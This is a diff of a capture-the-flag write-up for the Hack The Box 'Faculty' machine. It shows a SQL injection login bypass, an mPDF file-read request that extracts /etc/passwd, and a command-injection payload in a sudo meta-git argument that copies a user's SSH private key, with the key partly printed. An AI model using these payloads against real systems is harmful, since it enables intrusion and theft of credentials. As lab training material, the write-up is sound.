@@ -30,7 +30,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 18.10 seconds
 ```
-Run a quick feroxbuster before navigating to the webpage and it finds alot.
+Run a quick feroxbuster before navigating to the webpage and it finds alot. Most notably is the admin/login.php and admin/db_connect.php
 
 ```console
 ─$ feroxbuster -u http://faculty.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
@@ -107,13 +107,17 @@ Run a quick feroxbuster before navigating to the webpage and it finds alot.
 
 The login page looks pretty good and happens to be vulnerable to a SQLI login bypass. I tried using burp intruder for this but it was not working for me. eventually I got it through manual input since I am avoiding using sqlmap these things are tougher.
 
-http://faculty.htb/admin/login.php
+
+![image](https://user-images.githubusercontent.com/105310322/193356140-b6d21417-508b-45d5-bacd-9c952ad28fb2.png)
+
 
 Using the following SQLI we get logged in as admin.
 
 ```admin'or'1=1#```
 
-I messed around the next part for awhile before figuring out about the pdf exploit. Then it took some more time to get that working.
+Navigate to this page or any other that has a pdf download. I messed around the next part for awhile before figuring out about the pdf exploit. Then it took some more time to get that working.
+
+![image](https://user-images.githubusercontent.com/105310322/193356340-3232fcd9-d532-42c6-855e-e84e469eca5c.png)
 
 
 Using this string from the exploit linked below and inputting it into burp we can read local files.
@@ -136,6 +140,8 @@ Next decode as base64, then url decode, then url decode again to get a plain tex
 
 Take your new pdf string and in burpsuite intercept the course list download page.(Its the one that opens up a new tab and opens the pdf file)
 
+Overwrite the original pdf string with your pdf exploit.
+
 ```
 POST /admin/download.php HTTP/1.1
 Host: faculty.htb
@@ -152,14 +158,20 @@ Referer: http://faculty.htb/admin/index.php?page=courses
 Cookie: PHPSESSID=hneu6on85983rv7piegcgjot0d
 Cache-Control: max-age=0
 
-pdf=JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL2V0Yy9wYXNzd2QlMjUyMiUyNTIwY29udGVudD0lMjUyMi9ldGMvcGFzc3dkJTI1MjIlMjUyMGljb249JTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZT0lMjUyMkF0dGFjaGVkJTI1MjBGaWxlOiUyNTIwL2V0Yy9wYXNzd2QlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
+pdf=JTI1JTMzJTYzJTI1JTM2JTMxJTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTY2JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMyJTMwJTI1JTM2JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTM2JTM1JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTM5JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTM3JTI1JTM3JTMyJTI1JTM2JTMxJTI1JTM3JTMwJTI1JTM2JTM4JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM3JTM0JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTMxJTI1JTM3JTM0JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM2JTMzJTI1JTM2JTM4JTI1JTM2JTM1JTI1JTM2JTM0JTI1JTMyJTMwJTI1JTM0JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTYxJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTMwJTI1JTM2JTY2JTI1JTM3JTMzJTI1JTMyJTY0JTI1JTM3JTM4JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMzJTMxJTI1JTMzJTM5JTI1JTMzJTM1JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTMzJTY1
 ```
+![image](https://user-images.githubusercontent.com/105310322/193356584-0f2e1e8e-cb1c-4e51-8b61-4b6e9c03fe49.png)
+
+
 Send it in burpsuite and take the pdf link and put it at the end of your url.
 
 
 http://faculty.htb/mpdf/tmp/OKQVoYJgi9AqWEu045DZNwdzfX.pdf
 
 Doing so should bring you to a blank page, however attached to the pdf is the file passwd. So download it and we can view it on our machine.
+
+![image](https://user-images.githubusercontent.com/105310322/193356488-7d911901-4866-4208-9d11-0b91ab700a1e.png)
+
 
 The passwd file gives us 2 users gbyolo and developer. Lets see if we can get anything else.
 
@@ -256,6 +268,7 @@ To check for new updates run: sudo apt update
 You have mail.
 gbyolo@faculty:~$ 
 ```
+Next we can run sudo -l to see if we find anything. We get back meta-git. There was not anything in GTFO bins for it but I did not an exploit on hacker-one.
 
 
 ```console
@@ -269,13 +282,15 @@ User gbyolo may run the following commands on faculty:
 
 
 https://hackerone.com/reports/728040
+```
+So we take the command but and cat the id_rsa for the developer user and output it to a file.
 
 ```
 gbyolo@faculty:/tmp$ sudo -u developer /usr/local/bin/meta-git clone 'sss||cat /home/developer/.ssh/id_rsa > /tmp/id_rsa'
 meta git cloning into 'sss||cat /home/developer/.ssh/id_rsa > /tmp/id_rsa' at id_rsa
 ```
 
-
+Just like that its ours!
 
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -318,6 +333,9 @@ YEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j
 -----END OPENSSH PRIVATE KEY-----
 
 ```
+After logging in with our brand new key I messed around for awhile until I realized I was part of a debugging group. 
+This group also has access to GDB!
+
 ```console
 developer@faculty:/tmp$ id
 uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
